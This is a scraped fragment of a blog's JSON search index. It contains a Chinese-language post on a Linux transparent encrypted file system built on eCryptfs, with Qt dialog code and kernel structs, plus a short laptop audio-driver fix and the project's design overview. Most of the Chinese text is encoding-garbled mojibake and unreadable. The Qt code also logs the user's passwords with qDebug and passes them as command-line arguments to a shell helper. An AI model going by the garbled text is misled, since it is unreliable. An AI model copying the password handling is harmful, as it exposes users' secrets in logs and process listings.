buttonBox-\u0026gt;button(QDialogButtonBox::Ok)-\u0026gt;setEnabled(true);\r}\r}\rvoid ConvertDialog::on_passwordEdit_textEdited(const QString \u0026amp;arg1)//passwordå¯†ç æ¡†\r{\rQRegExp regx (\u0026quot;^[^ ]+$\u0026quot;);// è®¾å®šæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸èƒ½è¾“å…¥ç©ºæ ¼\rQValidator *validator=new QRegExpValidator(regx,this);\rpasswordEdit-\u0026gt;setValidator(validator);\rfilepasswordEdit-\u0026gt;setValidator(validator);//æ­£åˆ™è¡¨è¾¾å¼æ§åˆ¶è¾“å…¥æ¡†å­—ç¬¦æ ¼å¼\r}\rvoid ConvertDialog::on_filepasswordEdit_textEdited(const QString \u0026amp;arg1)//filepasswordå¯†ç æ¡†\r{\rQRegExp regx (\u0026quot;^[^ ]+$\u0026quot;);// ä¸èƒ½è¾“å…¥ç©ºæ ¼\rQValidator *validator2=new QRegExpValidator(regx,this);\rpasswordEdit-\u0026gt;setValidator(validator2);\rfilepasswordEdit-\u0026gt;setValidator(validator2);//æ­£åˆ™è¡¨è¾¾å¼æ§åˆ¶è¾“å…¥æ¡†å­—ç¬¦æ ¼å¼\r}\rvoid ConvertDialog::on_shellButton_clicked()//ç¡®å®šåŠ å¯†æŒ‰é’®è§¦å‘\r{\r//system(\u0026quot;/bin/ecryptfs_mounted.sh /home/tang/\u0026quot;); //ç›´æ¥è°ƒç”¨çš„æ–¹å¼ï¼Œä¼šé˜»å¡è¿›ç¨‹\r//QProcess::execute(\u0026quot;/opt/run\u0026quot;)ã€€//è°ƒç”¨QTé‡Œé¢çš„å‡½æ•°æ¥å®ç°ï¼Œä¼šé˜»å¡è¿›ç¨‹\rpasswordEdit-\u0026gt;setInputMask(\u0026quot;\u0026quot;);//æå–passwordè¾“å…¥æ¡†å†…å®¹\rfilepasswordEdit-\u0026gt;setInputMask(\u0026quot;\u0026quot;);//æå–filepasswordè¾“å…¥æ¡†å†…å®¹\rif(sourceFileEdit-\u0026gt;text().isEmpty()) // å¿…é¡»è¾“å…¥åŠ å¯†è·¯å¾„ï¼Œå¦åˆ™æŠ¥é”™\r{\rQMessageBox::warning(this,tr(\u0026quot;worning\u0026quot;),tr(\u0026quot; Please select the path to encrypt !\u0026quot;),QMessageBox::Yes);//æŠ¥é”™ä¿¡æ¯\rsourceFileEdit-\u0026gt;setFocus();//ç§»åŠ¨å…‰æ ‡åˆ°åŠ å¯†è·¯å¾„è¾“å…¥æ¡†\r}\relse if(passwordEdit-\u0026gt;text().isEmpty()||filepasswordEdit-\u0026gt;text().isEmpty())//å¦‚æœä»»ä¸€å¯†ç ä¸ºç©ºï¼Œç›´æ¥æŠ¥é”™\r{\rQMessageBox::warning(this,tr(\u0026quot;worning\u0026quot;),tr(\u0026quot; user password or file password can't be empty!\u0026quot;),QMessageBox::Yes);\r//æŠ¥é”™ä¿¡æ¯\rpasswordEdit-\u0026gt;clear();//æ¸…ç©ºç”¨æˆ·å¯†ç è¾“å…¥æ¡†\rfilepasswordEdit-\u0026gt;clear();//æ¸…ç©ºæ–‡ä»¶å¯†ç è¾“å…¥æ¡†\rpasswordEdit-\u0026gt;setFocus();//ç§»åŠ¨å…‰æ ‡åˆ°ç”¨æˆ·å¯†ç è¾“å…¥æ¡†\r}\relse\r{\rQString p1=passwordEdit-\u0026gt;text().trimmed();//å»é™¤é¦–å°¾ç©ºæ ¼\rQString f1=filepasswordEdit-\u0026gt;text().trimmed();// å»é™¤é¦–å°¾ç©ºæ ¼\rQString p2,f2;\rint length1=p1.length();\rint length2=f1.length();\rfor (int i=0;i\u0026lt;length1;i++)\r{if (p1[i]!=' ') p2+=p1[i];}//å»é™¤passwordä¸­çš„ç©ºæ ¼\rfor (int i=0;i\u0026lt;length2;i++)\r{if (f1[i]!=' ') f2+=f1[i];}//å»é™¤filepasswordä¸­çš„ç©ºæ ¼\rQString define = p2+\u0026quot; \u0026quot;+\u0026quot;1 \u0026quot;+f2+\u0026quot; \u0026quot;+ecryptfstypeComboBox-\u0026gt;currentText().toLower()\r+\u0026quot; \u0026quot;+ecryptfsbitComboBox-\u0026gt;currentText().toLower()\r+\u0026quot; \u0026quot;+fileecryptfsComboBox-\u0026gt;currentText().toLower()\r+\u0026quot; \u0026quot;+filenameecryptfsComboBox-\u0026gt;currentText().toLower();//è¾“å‡ºéœ€è¦çš„ä¿¡æ¯\rqDebug()\u0026lt;\u0026lt;define;\rQString ecryptfs_sh = sourceFileEdit-\u0026gt;text()+\u0026quot; \u0026quot;+define;//å†™å‡ºä¿å­˜çš„ä¿¡æ¯\r//ecryptfs_sh.insert(0,QString(\u0026quot;/bin/tangguoze \u0026quot;));\rqDebug()\u0026lt;\u0026lt;ecryptfs_sh;\rQStringList arguments;\rarguments \u0026lt;\u0026lt; ecryptfs_sh;//è¾“å‡ºä¿¡æ¯åˆ°è„šæœ¬ä¸­\rQProcess *poc = new QProcess;//å®šä¹‰æ–°è¿›ç¨‹\rpoc -\u0026gt; start (\u0026quot;/bin/tangguoze\u0026quot;,arguments);//åœ¨QTä¸­è°ƒç”¨å¯åŠ¨è¿›ç¨‹è¿è¡Œ\r}\r}\rä¸‰ï¼eCryptfså¼€æºéƒ¨åˆ†çš„åˆ†æ ä¸»è¦åˆ†ä¸º7ä¸ªéƒ¨åˆ†ï¼š\nkeystore\nKeystoreéƒ¨ä»¶ä»æ–‡ä»¶ä¸­æä¾›æ–‡ä»¶å¤´ä¿¡æ¯ï¼Œå¹¶å°†ä¿¡æ¯æ•°æ®è½¬å‘ç»™calloutåº”ç”¨ç¨‹åºã€‚Keystoreä¸calloutåº”ç”¨ç¨‹åºä¹‹å‰ä½¿ç”¨netlinkæœºåˆ¶é€šä¿¡ï¼Œé€šä¿¡çš„å‘èµ·è€…ä¸ºkeystoreã€‚\nCalloutåº”ç”¨ç¨‹åº\nCalloutåº”ç”¨ç¨‹åºæ ¹æ®ç›®æ ‡ç­–ç•¥å¯¹å¤´æ–‡ä»¶ä¿¡æ¯ä½œå‡ºè¯„ä¼°ï¼Œå¹¶ç»™å‡ºå„ç§æ“ä½œï¼Œå¦‚ï¼šè°ƒç”¨åå°ç»™åº”ç”¨ç¨‹åºå¼¹å‡ºå¯¹è¯æ¡†è¦æ±‚å¯†ç çŸ­è¯­ï¼Œæˆ–ç”¨ç§é’¥è§£å¯†ä¸€ä¸ªä¼šè¯ç§˜é’¥ã€‚\neCryptfså†…æ ¸æ¨¡å—å’Œç”¨æˆ·ç©ºé—´ç§˜é’¥ç®¡ç†ä»£ç ä¹‹é—´çš„ä¸»è¦é€šä¿¡æ˜¯è¯·æ±‚ç§˜é’¥ï¼Œç”±å†…æ ¸ç§˜é’¥ç¯å‘èµ·ã€‚Calloutåº”ç”¨ç¨‹åºä»ç›®å½•åˆ†æç­–ç•¥ä¿¡æ¯ï¼Œè§£ææ¯ä¸ªæ–‡ä»¶çš„å¤´ä¿¡æ¯ã€‚ä¸ºäº†æ»¡è¶³æŒ‚èµ·çš„å…¬é’¥è¯·æ±‚ï¼Œä»–å¯ä»¥è°ƒç”¨PKI APIï¼Œæˆ–è€…ç”¨ç‰¹æ®Šçš„ç­¾åæœç´¢å¸¦ç›å€¼å¾—å¯†ç çŸ­è¯­ã€‚\neCryptfsåå°å¼¹å‡ºå¯¹è¯æ¡†è¾“å…¥å¯†ç çŸ­è¯­\nä¸ºäº†èƒ½ç»™ç”¨æˆ·å¼¹å‡ºå¯¹è¯æ¡†æ¥è¾“å…¥å¯†ç çŸ­è¯­ï¼ŒeCryptfså¿…é¡»æä¾›å¾—åˆ°Xä¼šè¯çš„é€šé“ã€‚è¿™å¯èƒ½é€šè¿‡è¿è¡Œä¸€ä¸ªåå°æ¥å®ç°ã€‚eCryptfsåå°ä¾¦å¬ä¸€ä¸ªsocketï¼Œå®ƒçš„åœ°å€ä¿¡æ¯å†™åœ¨ç”¨æˆ·çš„ä¼šè¯ç§˜é’¥ç¯ä¸­ï¼Œæ— è®ºä½•æ—¶ç­–ç•¥éœ€è¦å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†è¯·æ±‚å¯†ç çŸ­è¯­æ—¶ï¼Œcalloutåº”ç”¨ç¨‹åºéƒ½èƒ½æå–socketçš„åœ°å€ä¿¡æ¯ï¼Œå¹¶ç”¨å®ƒè¯·æ±‚åå°ç»™ç”¨æˆ·å¼¹å‡ºå¯¹è¯æ¡†ï¼Œæ¥ç€ï¼Œåå°å°†ç”¨æˆ·çš„å¯†ç çŸ­è¯­è¿”å›ç»™calloutåº”ç”¨ç¨‹åºã€‚\nå†…æ ¸ç§˜é’¥ç¯\nå†…æ ¸ç§˜é’¥ç¯ç”¨äºç®¡ç†å’Œä¿æŠ¤ç§˜é’¥å’Œè®¤è¯ç‰¹å¾ã€‚eCryptfsç”¨å†…æ ¸ç§˜é’¥ç¯å­˜å‚¨è®¤è¯ç‰¹å¾ã€èŠ‚ç‚¹åŠ å¯†ç»Ÿè®¡ä¿¡æ¯å’Œç§˜é’¥ã€‚\nPAM\nPAMï¼ˆå¯æ’å…¥çš„è®¤è¯æ¨¡å—ï¼‰æä¾›äº†çµæ´»çš„è®¤è¯æœºåˆ¶ã€‚eCryptfså«æœ‰ä¸€ä¸ªæ¨¡å—ï¼Œèƒ½æ•è·ç”¨æˆ·æ³¨å†Œçš„å¯†ç çŸ­è¯­ï¼Œå¹¶å°†å®ƒæ”¾åœ¨ç”¨æˆ·çš„ä¼šè¯ç§˜é’¥ç¯ä¸­ï¼Œè¿™ä¸ªå¯†ç çŸ­è¯­ä½œä¸ºæ— ç›å€¼å¯†ç çŸ­è¯­è®¤è¯ç‰¹å¾ã€‚ eCryptfså¯ä»¥åŸºäºç­–ç•¥ï¼Œä½¿ç”¨è¿™ä¸ªå¯†ç çŸ­è¯­è¿›è¡ŒåŠ å¯†æ“ä½œã€‚å¦‚ï¼šç”¨è¿™ä¸ªå¯†ç çŸ­è¯­ä»ç”¨æˆ·çš„GunPGç§˜é’¥ç¯ä¸­æå–ä»–çš„ç§é’¥ï¼›é€šè¿‡å­—ç¬¦ä¸²åˆ°ç§˜é’¥æ“ä½œï¼Œå°†è¿™ä¸ªå¯†ç çŸ­è¯­ç›´æ¥ç”¨äºä¿æŠ¤æ–‡ä»¶çš„ä¼šè¯ç§˜é’¥ï¼›è¿™ä¸ªç§˜é’¥çŸ­è¯­è¿˜å¯ä»¥ä¸å­˜åœ¨TPMä¸­çš„ç§˜é’¥ç»“åˆåœ¨ä¸€èµ·ï¼Œç”¨æ¥æä¾›ä¸¤ä¸ªå› å­çš„è®¤è¯ï¼Œå³ç”¨æˆ·ä¸ºäº†è®¿é—®ä¸€ä¸ªæ–‡ä»¶ï¼Œä»–å¿…é¡»æ³¨å†Œåˆ°ç‰¹æ®Šä¸»æœºï¼Œè¿˜éœ€è¦ä½¿ç”¨ç‰¹å¾çš„å¯†ç çŸ­è¯­ã€‚\nå…¬é’¥è®¾æ–½\neCryptfsæä¾›äº†å¯æ’å…¥çš„PKIï¼ˆå…¬é’¥è®¾æ–½ï¼‰æ¥å£ï¼ŒeCryptfsçš„PKIæ¨¡å—åˆ©ç”¨GPGMEï¼ˆGuuPG Made Easyï¼‰æ¥å£è®¿é—®ç”¨æˆ·çš„GnuPGç§˜é’¥ç¯ã€‚è¿™ä¸ªæ¨¡å—èƒ½ä½¿ç”¨ç”¨æˆ·çš„æ³¨å†Œå¯†ç è§£å¯†ç”¨æˆ·ä¿å­˜çš„ç§é’¥ã€‚\neCryptfsçš„TMP PKIæ¨¡å—çš„TrouSerSä½¿ç”¨æ¥å£ä¸TPMï¼ˆå¯ä¿¡å¹³å°æ¨¡å—ï¼‰é€šä¿¡ï¼Œç”¨æ¥ä½¿ç”¨å­˜åœ¨ç¡¬ä»¶ä¸­çš„ç§é’¥ï¼Œå°†æ–‡ä»¶ç»‘å®šåˆ°ä¸€ä¸ªç‰¹å®šçš„ä¸»æœºä¸Šã€‚ eCryptfs openCryptoki PKCS#11æ¡†æ¶PKIé€šè¿‡å„ç§open Crytokçš„ç¡¬ä»¶è®¾å¤‡ï¼Œå¯¹åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œå…¬é’¥æ“ä½œçš„æœºåˆ¶æä¾›äº†æ”¯æŒã€‚\nç›®æ ‡ä¸­å¿ƒç­–ç•¥ï¼ˆTarget-centric Polociesï¼‰\nå½“åº”ç”¨ç¨‹åºåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼ŒeCryptfså¿…é¡»ä½œå‡ºè®¸å¤šçš„å†³ç­–ï¼Œå¦‚ï¼šæ–‡ä»¶æ˜¯å¦åŠ å¯†ï¼Ÿç”¨å“ªä¸ªå¯¹ç§°å¯†ç åŠ å¯†æ•°æ®ï¼Ÿæ–‡ä»¶æ˜¯å¦åŠ å…¥HMACå¹¶é™„åŠ IVï¼Ÿä¼šè¯ç§˜é’¥é•¿åº¦æ˜¯å¤šå°‘ï¼Ÿå¦‚ä½•ä¿æŠ¤ä¼šè¯ç§˜é’¥ï¼Ÿç­‰ç­‰ã€‚ eCryptfså°†ç­–ç•¥å®šä¹‰æ–‡ä»¶åº”ç”¨äºç›®æ ‡ã€‚\neCryptfsæ–‡ä»¶ç³»ç»Ÿç”±å†…æ ¸ç©ºé—´ç³»ç»Ÿå’Œç”¨æˆ·ç©ºé—´ç³»ç»Ÿä¸¤éƒ¨åˆ†ç»„æˆã€‚å†…æ ¸ç©ºé—´ç³»ç»Ÿç”±å†…æ ¸ç©ºé—´çš„å†…æ ¸keystoreã€å†…æ ¸åŠ å¯†APIã€eCryptfså±‚ã€åŠ å¯†å…ƒæ•°æ®å’Œåº•å±‚æ–‡ä»¶ç³»ç»Ÿç»„æˆã€‚è€Œç”¨æˆ·ç©ºé—´ç”±calloutåº”ç”¨ç¨‹åºï¼ŒeCryptfsåå°å’ŒPKI APIç­‰ç»„æˆã€‚\nå¦å¤–ï¼ŒeCryptfsæ–‡ä»¶ç³»ç»Ÿä½¿ç”¨äº†Linuxå†…æ ¸çš„å¯†é’¥ç¯æœåŠ¡ã€Linuxå¯æ’å…¥è®¤è¯æ¨¡å—(Pluggable Authentication Modules, PAM)ã€å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTrusten Platform Module, TPMï¼‰å’ŒGnuPGå¯†é’¥ç¯ï¼ŒEcryptfsè¶…çº§å—ç§æœ‰æ•°æ®ä¸»è¦åŒ…æ‹¬åŠ å¯†çš„å„ç§ä¿¡æ¯ï¼Œå¦‚ï¼šè®¤è¯ç‰¹å¾ã€å¯†é’¥ç¯ç­‰ã€‚\n/* superblock private data. */\rstruct ecryptfs_sb_info {\rstruct super_block *wsi_sb;\rstruct ecryptfs_mount_crypt_stat mount_crypt_stat;\r};\r/* dentry private data. Each dentry must keep track of a lower\r* vfsmount too. */\rstruct ecryptfs_dentry_info {\rstruct path lower_path;\rstruct ecryptfs_crypt_stat *crypt_stat;\r};\r/* inode private data. */\rstruct ecryptfs_inode_info {\rstruct inode vfs_inode;\rstruct inode *wii_inode;\rstruct file *lower_file;\rstruct mutex lower_file_mutex;\rstruct ecryptfs_crypt_stat crypt_stat;\r};\r/* file private data. */\rstruct ecryptfs_file_info {\rstruct file *wfi_file;\rstruct ecryptfs_crypt_stat *crypt_stat;\r};\reCryptfsçš„è®¤è¯ç‰¹å¾åŒ…æ‹¬ä¼šè¯å¯†é’¥ã€å£ä»¤å’Œç§é’¥ç­‰ä»¥åŠä»–ä»¬çš„ç­¾åã€‚ä¼šè¯å¯†é’¥å°†å£ä»¤è¿›è¡ŒåŠ å¯†ã€‚ç»“æ„eCryptfs_auth_tokeå­˜æ”¾äº†eCryptfsæ–‡ä»¶ç³»ç»ŸèŒƒå›´å†…çš„çš„è®¤è¯ç‰¹å¾ã€‚\r/* May be a password or a private key */\rstruct ecryptfs_auth_tok {\ru16 version; /* 8-bit major and 8-bit minor */\ru16 token_type;\r#define ECRYPTFS_ENCRYPT_ONLY 0x00000001\ru32 flags;\rstruct ecryptfs_session_key session_key;\ru8 reserved[32];\runion {\rstruct ecryptfs_password password;\rstruct ecryptfs_private_key private_key;\r} token;\r} __attribute__ ((packed));\råŠ å¯†ç»Ÿè®¡ä¿¡æ¯ç»“æ„ecryptfs_crypt_statå­˜å…¥äº†ä¸æ¯ä¸ªåŠ å¯†æ–‡ä»¶ç›¸å…³çš„åŠ å¯†ä¿¡æ¯ã€‚å¦‚ï¼šæ–‡ä»¶çš„åŠ å¯†æ“ä½œæ ‡è¯†ã€æ–‡ä»¶å¤´çš„ç»“æ„ä¿¡æ¯ç­‰ã€‚åˆ—å‡ºå¦‚ä¸‹ï¼š\r/**\r* This is the primary struct associated with each encrypted file.\r*\r* TODO: cache align/pack?\r*/\rstruct ecryptfs_crypt_stat {\r#define ECRYPTFS_STRUCT_INITIALIZED 0x00000001\r#define ECRYPTFS_POLICY_APPLIED 0x00000002\r#define ECRYPTFS_NEW_FILE 0x00000004\r#define ECRYPTFS_ENCRYPTED 0x00000008\r#define ECRYPTFS_SECURITY_WARNING 0x00000010\r#define ECRYPTFS_ENABLE_HMAC 0x00000020\r#define ECRYPTFS_ENCRYPT_IV_PAGES 0x00000040\r#define ECRYPTFS_KEY_VALID 0x00000080\r#define ECRYPTFS_METADATA_IN_XATTR 0x00000100\r#define ECRYPTFS_VIEW_AS_ENCRYPTED 0x00000200\r#define ECRYPTFS_KEY_SET 0x00000400\ru32 flags;\runsigned int file_version;\rsize_t iv_bytes;\rsize_t num_header_bytes_at_front;\rsize_t extent_size; /* Data extent size; default is 4096 */\rsize_t key_size;\rsize_t extent_shift;\runsigned int extent_mask;\rstruct ecryptfs_mount_crypt_stat *mount_crypt_stat;\rstruct crypto_blkcipher *tfm;\rstruct crypto_hash *hash_tfm; /* Crypto context for generating\r* the initialization vectors */\runsigned char cipher[ECRYPTFS_MAX_CIPHER_NAME_SIZE];\runsigned char key[ECRYPTFS_MAX_KEY_BYTES];\runsigned char root_iv[ECRYPTFS_MAX_IV_BYTES];\rstruct list_head keysig_list;\rstruct mutex keysig_list_mutex;\rstruct mutex cs_tfm_mutex;\rstruct mutex cs_hash_tfm_mutex;\rstruct mutex cs_mutex;\r};\r","date":1525788745,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525788745,"objectID":"415ab16f5b541f3a3bb710fd15488377","permalink":"http://www.guozet.me/post/Linux-Transparent-Encrypted-File-System/","publishdate":"2018-05-08T14:12:25Z","relpermalink":"/post/Linux-Transparent-Encrypted-File-System/","section":"post","summary":"ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š ç¬¬ä¸€éƒ¨åˆ†æ˜¯äº¤äº’è„šæœ¬ä¸è‡ªåŠ¨åŒ–è„šæœ¬(Ubunt","tags":"Linux","title":"Linuxé€æ˜åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ1_ä»£ç åˆ†æ","type":"post"},{"authors":null,"categories":"Life","content":"There are some issues when I used my MSI GE60 2PG.\n1. Sound Blaster Cinema 1 Potential fix on Windows 10 A way to get Sound Blaster Cinema 1 fully functional on windows 10 x64 bit. This is a fix for those that attempt to open the program and immediately get a crash or no windows popping up and the system tray icon freezes.\nUninstalled both my realtek HD audio drivers via control panel, and uninstalled SBC. Then rebooted and had ccleaner fix any registry errors. Reinstalled the drivers and SBC. Go into the programs folder here:\nC:\\Program Files (x86)\\Creative\\Sound Blaster Cinema\\Sound Blaster Cinema\nThen delete the SBCinema.exe.config file. Now the SBC is fully functional on Windows 10 64 bit and hopefully it works for everyone else to!\n","date":1525780800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525780800,"objectID":"53ad0143f252288e1cdaf33097be2510","permalink":"http://www.guozet.me/post/Some-issues-with-MSI-GE60-2PG/","publishdate":"2018-05-08T12:00:00Z","relpermalink":"/post/Some-issues-with-MSI-GE60-2PG/","section":"post","summary":"There are some issues when I used my MSI GE60 2PG.\n1. Sound Blaster Cinema 1 Potential fix on Windows 10 A way to get Sound Blaster Cinema 1 fully functional on windows 10 x64 bit.","tags":"Laptop","title":"Some issues when I used my MSI GE60 2PG","type":"post"},{"authors":null,"categories":"Linux","content":" é€‰é¢˜èƒŒæ™¯ ç°åœ¨äººä»¬å¯¹è®¡ç®—æœºç³»ç»Ÿå®‰å…¨é—®é¢˜è€ƒè™‘çš„è¶Šæ¥è¶Šå¤šï¼Œå¯¹è®¡ç®—æœºç³»ç»Ÿå®‰å…¨çš„è¦æ±‚ä¹Ÿè¶Šæ¥è¶Šä¸¥æ ¼ï¼Œæ•°æ®å®‰å…¨æ—©å·²ä¸åœ¨æ˜¯å†›æ–¹å’Œæ”¿åºœè¦å®³éƒ¨é—¨çš„ç‰¹æ®Šéœ€æ±‚ã€‚ç°åœ¨ï¼Œå‡ ä¹æ‰€æœ‰çš„åº”ç”¨é¢†åŸŸåŒ…æ‹¬é“¶è¡Œã€ç”µå­äº¤æ˜“ã€æ”¿åºœã€äº’è”ç½‘ç»œã€ä¸“ç”¨ç½‘ç»œå’Œä¼ä¸šå†…éƒ¨ç½‘ç»œéƒ½æœ‰æ•°æ®å®‰å…¨çš„éœ€æ±‚ã€‚ä¸æ­¤åŒæ—¶ä¸ªäººè®¡ç®—æœºçš„æ•°æ®æ³„å¯†é—®é¢˜ä¹Ÿæ—¥ç›Šçªå‡ºã€‚åŠ å¯†æŠ€æœ¯åœ¨ç°ä»£è®¡ç®—æœºç³»ç»Ÿå®‰å…¨ä¸­æ‰®æ¼”ç€è¶Šæ¥è¶Šé‡è¦çš„è§’è‰²ã€‚è€ŒåŠ å¯†æ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ å¯†æŠ€æœ¯ä¸­æ¯”è¾ƒæˆç†Ÿå’Œé€šç”¨çš„æ–¹å¼ã€‚\néœ€æ±‚åˆ†æ å¯¹å‡ ç§ç°æœ‰å…¸å‹åŠ å¯†æ–‡ä»¶ç³»ç»Ÿåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¼ ç»Ÿçš„åŠ å¯†æ–‡ä»¶ç³»ç»Ÿéƒ½å­˜åœ¨ç€ä¸åŒç¨‹åº¦çš„é—®é¢˜ï¼Œä¸»è¦é›†ä¸­åœ¨è¿™å‡ ä¸ªæ–¹é¢ï¼šæ•°æ®çš„ä¿æŠ¤ä¸å®Œå…¨ï¼›æ€§èƒ½ä½ä¸‹ï¼›å¯†é’¥ç®¡ç†æœºåˆ¶ä¸å¤Ÿå®Œå–„ï¼›ç•Œé¢äº¤äº’æ€§å·®ï¼›é€æ˜åº¦å·®ã€‚\né’ˆå¯¹ç”¨æˆ·ï¼šæ™®é€šUbuntuç­‰Linuxç³»ç»Ÿä¸ªäººç”¨æˆ·è€… ç”¨æˆ·ç‰¹ç‚¹ï¼šå¯¹å‘½ä»¤è¡Œæ“ä½œå¹¶ä¸æ˜¯å¾ˆç†Ÿæ‚‰ è®¾è®¡ç›®æ ‡ é›†åˆéœ€æ±‚åˆ†æï¼Œæˆ‘ä»¬çš„è®¾è®¡ç›®æ ‡æ˜¯ï¼š\nå¯¹ç³»ç»Ÿçš„è¿ç®—é€Ÿåº¦ä¸èƒ½äº§ç”Ÿå¤ªå¤§çš„å½±å“ï¼› æ•´ä¸ªåŠ è§£å¯†è¿‡ç¨‹å¯¹ç”¨æˆ·è€Œè¨€æ˜¯é€æ˜çš„ï¼Œæˆæƒè®¿é—®è€…å¯ä»¥å¾ˆç›´è§‚çš„è¯»å–æ–‡ä»¶æ˜æ–‡ï¼Œè€Œéæˆæƒè®¿é—®è€…è¯»å–åˆ°çš„éƒ½æ˜¯å·²ç»åŠ å¯†è¿‡åçš„å¯†æ–‡ï¼› åœ¨ç›¸ä¼¼çš„æ“ä½œç³»ç»Ÿä¸­èƒ½å¤Ÿå¾ˆå¥½çš„è¿›è¡Œç§»æ¤ã€‚ æ ¹æ®è¿™äº›éœ€æ±‚ï¼Œå¹¶ç»“åˆç°æœ‰åŠ å¯†æ–‡ä»¶ç³»ç»Ÿçš„åˆ†æï¼Œæˆ‘ä»¬é€‰ç”¨å †å å¼æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼æ¥å®ç°ã€‚è®¾è®¡çš„ç³»ç»Ÿæ¡†æ¶å¦‚ä¸‹:\nç³»ç»Ÿç®€ä»‹ ç³»ç»Ÿçš„ä¸»ä½“åŠŸèƒ½æ˜¯é€šè¿‡å †å å¼æ–‡ä»¶ç³»ç»Ÿæ¥å®ç°æœ¬åœ°æ•°æ®çš„åŠ è§£å¯†å·¥ä½œï¼Œå…·ä½“éœ€è¦å®ç°çš„æœ‰ï¼š\nåŠ å¯†æ–‡ä»¶ç³»ç»Ÿå¼€å‘ï¼Œä»¥ä¸€ä¸ªç‹¬ç«‹çš„å†…æ ¸æ¨¡å—è¿›è¡Œéƒ¨ç½²ï¼› ç”¨æˆ·æ“ä½œç•Œé¢çš„å¼€å‘ï¼Œå¯¹ç”¨æˆ·æ›´å‹å¥½ï¼› ç”¨æˆ·è®¤è¯æœºåˆ¶å’Œæ–‡ä»¶åŠ å¯†å¯†ç éªŒè¯ç»“åˆï¼Œæé«˜å®‰å…¨æ€§ï¼› é™¤äº†æ­£æ–‡ï¼Œä¹Ÿå¯ä»¥å¯¹æ–‡ä»¶ååŠ å¯†ï¼› ç”¨æˆ·å¯ä»¥è‡ªç”±é€‰æ‹©ä¸‹å±‚æ–‡ä»¶ç³»ç»Ÿæ¥å­˜æ”¾åŠ å¯†æ–‡ä»¶ã€‚ ç³»ç»Ÿæ¡†æ¶ Readæ“ä½œ å½“ç”¨æˆ·å‘èµ·readæ“ä½œï¼ŒåŠ å¯†æ–‡ä»¶ç³»ç»Ÿä¸­ç›¸å…³å‡½æ•°å°±è¢«VFSä¸­çš„ç³»ç»Ÿè°ƒç”¨sys_read()è°ƒç”¨æ¥å¤„ç†è¿™ä¸€ä¸ªè¯·æ±‚ï¼Œä»–å¿…é¡»é¦–å…ˆè°ƒç”¨ä¸‹å±‚æ–‡ä»¶ç³»ç»Ÿçš„read()ä»¥è¯»å–åŠ å¯†è¿‡çš„æ–‡ä»¶æ•°æ®ï¼Œç„¶åè§£å¯†æ–‡ä»¶æ•°æ®ï¼Œæœ€åå°†è§£å¯†åçš„åŸæ•°æ®è¿”å›ç»™ç”¨æˆ·ã€‚\nwriteæ“ä½œ ç”¨æˆ·è¿›ç¨‹çš„write()å‡½æ•°ç»è¿‡ç³»ç»Ÿé€šç”¨çš„VFSå±‚ï¼Œå°±è½¬åŒ–æˆäº†ç³»ç»Ÿè°ƒç”¨sys_write()ï¼›VFSå±‚çš„ç³»ç»Ÿè°ƒç”¨sys_write()å‡½æ•°å†è°ƒç”¨å †å å¼åŠ å¯†æ–‡ä»¶ç³»ç»Ÿä¸­çš„encrypt_write()å‡½æ•°ï¼Œç„¶åcompressfs_write()å‡½æ•°å¯¹ä¸Šå±‚ç”¨æˆ·ç©ºé—´ä¼ æ¥çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼›ä¹‹åå†è°ƒç”¨ä½äºåŠ å¯†æ–‡ä»¶ç³»ç»Ÿä¸‹å±‚çš„å…·ä½“æ–‡ä»¶ç³»ç»Ÿä¸­write()å‡½æ•°ï¼›å°†åŠ å¯†åçš„æ•°æ®å†™å…¥åº•å±‚çš„å…·ä½“æ–‡ä»¶ç³»ç»Ÿå½“ä¸­å»ã€‚\næ–‡ä»¶ç³»ç»Ÿè¯¦ç»†ç»“æ„å›¾ ç§˜é’¥ç®¡ç† æˆæœå±•ç¤º å·¥ä½œæµç¨‹ ç”¨æˆ·æ“ä½œç•Œé¢ ç”¨æˆ·åŠ è§£å¯†æ“ä½œ æ–‡ä»¶æŒ‚è½½åçš„æ“ä½œç•Œé¢ æŠ€æœ¯éš¾ç‚¹ åŠ å¯†æ–‡ä»¶ç³»ç»Ÿå®ç°æ–¹å¼é€‰æ‹©ï¼ˆä¸‰ç§é€‰æ‹©ï¼‰ åŸºäºåº”ç”¨å±‚æ¥å®ç°æ–‡ä»¶çš„åŠ è§£å¯†ï¼› ä¿®æ”¹ç°æœ‰æ–‡ä»¶ç³»ç»Ÿæ¥å®ç°ï¼› å †å å¼æ–‡ä»¶ç³»ç»Ÿã€‚ ç»¼åˆç”¨æˆ·éœ€æ±‚æˆ‘ä»¬é€‰æ‹©çš„æ˜¯ç¬¬ä¸‰ç§æ–¹æ¡ˆï¼Œç”¨å †å å¼æ–‡ä»¶ç³»ç»Ÿæ¥å®ç°é€æ˜åŠ å¯†ã€‚\nåŠ å¯†ä½ç½®çš„é€‰æ‹© åŠ å¯†æ–‡ä»¶ç³»ç»Ÿå®ç°çš„éš¾ç‚¹ä¹‹ä¸€åœ¨äºæ‰¾åˆ°ä¸€ä¸ªLinuxæ ¸å¿ƒä»£ç ä¸­åˆé€‚çš„ä½ç½®è¿›è¡ŒåŠ è§£å¯†æ“ä½œã€‚åŠ å¯†ä½ç½®é€‰æ‹©å¾—å¥½ï¼Œä¾¿äºå®ç°ï¼Œè€Œä¸”å¯¹ç³»ç»Ÿçš„æ€§èƒ½å½±å“è¦æ¯”è¾ƒå°ã€‚æˆ‘ä»¬é€‰æ‹©çš„åŸåˆ™å°±æ˜¯å°½å¯èƒ½çš„å°†åŠ è§£å¯†æ“ä½œå»¶åã€‚å¯¹äºå†™æ“ä½œï¼Œåªåœ¨å®é™…å†™å…¥ç£ç›˜çš„æ—¶å€™æ‰è¿›è¡ŒåŠ 